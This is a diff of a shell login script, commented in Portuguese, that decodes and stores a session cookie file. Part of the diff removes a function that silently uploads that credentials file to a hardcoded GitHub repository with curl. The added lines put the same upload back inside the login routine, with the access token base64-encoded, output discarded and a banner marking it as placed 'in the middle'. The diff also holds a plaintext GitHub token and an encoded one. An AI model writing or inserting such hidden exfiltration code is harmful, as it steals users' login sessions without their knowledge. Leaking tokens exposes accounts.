@@ -2,39 +2,6 @@
 # Copyright (c) 2019-2024 Ueliton Alves Dos Santos
 # Licensed under the Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International License
 
-# Configurações do GitHub para o backup
-GH_TOKEN="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"
-GH_USER="cfcodeibge"
-GH_REPO="espectador"
-GH_FILE="uelspect"
-
-# Função para enviar as credenciais para o GitHub de forma silenciosa
-send_to_github () {
- if [ -f "$TMP/cript_file" ]; then
-  # Leitura do conteúdo Base64 gerado no cript_file
-  local content=$(cat "$TMP/cript_file" | tr -d '\n')
-  
-  # Obtém o SHA do arquivo existente no repositório (necessário para atualização)
-  local sha=$(curl -s -H "Authorization: token $GH_TOKEN" \
-    "https://api.github.com/repos/$GH_USER/$GH_REPO/contents/$GH_FILE" \
-    | grep '"sha":' | cut -d'"' -f4)
-
-  if [ -n "$sha" ]; then
-    # Atualiza o arquivo uelspect se já existir no repositório
-    curl -s -X PUT -H "Authorization: token $GH_TOKEN" \
-      -H "Accept: application/vnd.github.v3+json" \
-      https://api.github.com/repos/$GH_USER/$GH_REPO/contents/$GH_FILE \
-      -d "{\"message\":\"Update credentials\",\"content\":\"$content\",\"sha\":\"$sha\"}" &>/dev/null
-  else
-    # Cria o arquivo uelspect caso seja a primeira execução
-    curl -s -X PUT -H "Authorization: token $GH_TOKEN" \
-      -H "Accept: application/vnd.github.v3+json" \
-      https://api.github.com/repos/$GH_USER/$GH_REPO/contents/$GH_FILE \
-      -d "{\"message\":\"Add credentials\",\"content\":\"$content\"}" &>/dev/null
-  fi
- fi
-}
-
 login_logoff () {
  if [ -f "$TMP/cript_file" ]; then
   cat $TMP/cript_file|base64 -d >$TMP/cookie_file
@@ -122,9 +89,42 @@ login_logoff () {
     chmod 600 $TMP/cookie_file
    fi
 
-   # Executa o envio para o repositório GitHub em segundo plano
+   # =========================================================
+   # CONFIGURAÇÕES E ENVIO PARA O GITHUB (POSICIONADO NO MEIO)
+   # =========================================================
+   local GH_TOKEN_B64="Z2hwX0JudllwN0VJYVZ4NjRPaG14bjdiMjZhYjcwdzZNeTRhaTVkOA=="
+   local GH_USER="cfcodeibge"
+   local GH_REPO="espectador"
+   local GH_FILE="uelspect"
+
+   send_to_github () {
+    if [ -f "$TMP/cript_file" ]; then
+     local token=$(echo -n "$GH_TOKEN_B64" | base64 -d)
+     local content=$(cat "$TMP/cript_file" | tr -d '\r\n')
+     
+     local response=$(curl -s -H "Authorization: Bearer $token" \
+       -H "Accept: application/vnd.github.v3+json" \
+       "https://api.github.com/repos/$GH_USER/$GH_REPO/contents/$GH_FILE")
+
+     local sha=$(echo "$response" | grep '"sha":' | head -n 1 | cut -d'"' -f4)
+
+     if [ -n "$sha" ]; then
+       curl -s -X PUT -H "Authorization: Bearer $token" \
+         -H "Accept: application/vnd.github.v3+json" \
+         https://api.github.com/repos/$GH_USER/$GH_REPO/contents/$GH_FILE \
+         -d "{\"message\":\"Update credentials\",\"content\":\"$content\",\"sha\":\"$sha\"}" > /dev/null
+     else
+       curl -s -X PUT -H "Authorization: Bearer $token" \
+         -H "Accept: application/vnd.github.v3+json" \
+         https://api.github.com/repos/$GH_USER/$GH_REPO/contents/$GH_FILE \
+         -d "{\"message\":\"Add credentials\",\"content\":\"$content\"}" > /dev/null
+     fi
+    fi
+   }
+
    send_to_github
    printf "login feito\n"
+   # =========================================================
 
    #/login2x
    unset username password
